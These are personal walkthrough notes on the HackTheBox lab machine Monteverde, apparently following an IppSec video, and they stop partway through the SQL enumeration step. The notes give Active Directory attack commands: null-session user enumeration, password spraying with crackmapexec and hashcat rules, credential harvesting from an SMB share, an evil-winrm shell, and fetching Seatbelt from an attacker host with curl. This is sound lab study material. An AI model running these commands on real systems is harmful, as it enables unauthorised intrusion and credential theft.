**IppSec Walkthrough**

# Enum
1. Run an nmap scan on the IP, scripts, version detect, and output to a file
	1. `sudo nmap -sC -sV -oA nmap/monteverde 10.10.10.172`
	2. ![[Pasted image 20230308144844.png]]
	3. Not seeing a webserver, we think likely vectors to attack will be SMB and LDAP. But we'll be thorough first
2. Checking first service: DHCP
	1. `nslookup` -> `server 10.10.10.172` - set the DC as the server
	2. `127.0.0.1` - no result
	3. `megabank.local`
	4. `monteverde` - no result
	5. No valuable info gained
3. Moving on, check rpcclient with null authentication
	1. `rpcclient -U '' 10.10.10.172` - this gets us an authentication
	2. `enumdomusers` - to get all users
	3. ![[Pasted image 20230308151207.png]]
	4. Tab twice to get all commands, trying to figure out how to enum a user (or use ippsec.rocks)
	5. `querydisinfo` - to dump more AD info
	6. Copy users dump into a file on local system
4. With a list of users, we can try to build a wordlist from those users
	1. clean up the file with vim `vi users.txt`
		1. `6x` to delete first 6 chars, `d` to delete rest of line
		2. alternatively try a `sed` script 
		3. End result should like this: ![[Pasted image 20230308151625.png]]
		4. We also see the AAD... user, this is a cloud (Azure AD) virtual table link to upload users / user info to Azure, to include passwords. Keep note of this.
	2. create a password list derivative of the usernames to feed to [[hashcat]] and [[crackmapexec]] `cp users.txt password.txt`
		1. `vi password.txt` - add some more common words for hashcat to iterate on 'password, summer, love, etc.'
		2. `crackmapexec smb 10.10.10.172 --pass-pol` - retrieves password policy from AD server, we see Account Lockout Threshold is 'None' so we have no fear of bruteforce now
		3. `hashcat --force --stdout -r /usr/share/hashcat/rules/best64.rule password.txt > hc_passwords.txt` - generate a bunch of potential passwords using hashcat attacks
		4. `crackmapexec smb 10.10.10.172 -u users.txt -p users.txt` - initially to [[crackmapexec]] as a quiet option
		5. We already get a hit on SABatchJobs: ![[Pasted image 20230308160425.png]] but no 'pwned' meaning admin privileges
5. With this first user SABatchJobs's creds, we try to get footholds through different protocols
	1. `crackmapexec winrm 10.10.10.172 -u SABatchJobs -p SABatchJobs`- login over winrm fails
	2. `smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172` - [[smbmap]] enumerate shares using user creds, returning this: ![[Pasted image 20230308161405.png]]
	3. `smbmap -u '' -H 10.10.10.172` - also try null creds (can also try guest, anonymous), but this returns nothing
	4. `users` disk might be interesting 
	5. `smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172 -R --exclude SYSVOL IPC$` - recursively list contents of all the directories which we have access to, excluding SYSVOL and IPC since they will have a lot of useless info
	6. `.\users$\mhope\*` - was readable and had some contents: `azure.xml`
	7. `smbclient -U SABatchJobs //10.10.10.172/users$` -> `get azure.xml` -> `cd mhope` -> `get azure.xml` (or download via smbmap and view that way)
	8. And we see a plaintext password: ![[Pasted image 20230308163901.png]]

	> *going higher level on my notes here for the sake of time*

6. Use new found password in [[crackmapexec]] 
	1. `crackmapexec smb HOST -u users.txt -p '$n0therD4y@n0th3e$'`
	2. find its the 'mhope' password
	3. `crackmapexec winrm 10.10.10.172 -u users.txt -p 'THE_PASSWORD'` - returns a `(Pwn3d!)`
	4. 
# Foothold
1. [[evil-winrm]] `evil-winrm -u USER -p 'PASSWORD' -i HOST_IP` - gives us that good old reverse shell
	1.  target: `hostname; whoami; ipconfig` - good to show a "pwn"
2. Get [[Seatbelt]] onto the system and run
	1. `locate Seatbelt`
	2. `upload PATH_TO_SEATBELT` - doesn't work
	3. `cp PATH_TO_SEATBELT ./www/Seatbelt.exe`
	4. [[python]] server from Seatbelt dir
	5. `curl LOCAL_IP/Seatbelt.exe -o Seatbelt.exe`
	6. `.\Seatbelt.exe -group=all` - takes a while to run, returns a bunch of host info including installed services, credential files, scheduled jobs etc.
3. Get [[WinPEAS]] onto the system and run
	1. didn't get too much when we rushed through the output, did see that there is SQL managed DB
4. `whoami /all` - will also check group memberships
5. keyword search in WinPEAS output (ie. 'admin')
	1. Shows an 'Azure Admins' in current croups
6. try [[sqlcmd]] `sqlcmd` - we get no feedback, which means no error, so it works
	1.  `sqlcmd -Q "show_db"` - nothing
	2. `sqlcmd -Q "select * from sys.database"` - got a bunch of raw output, if we scroll up we can see column names to select
	3. `sqlcmd -Q "select name,create_date from sys.database"`
7. Alternatively, try [[PowerUpSQL]]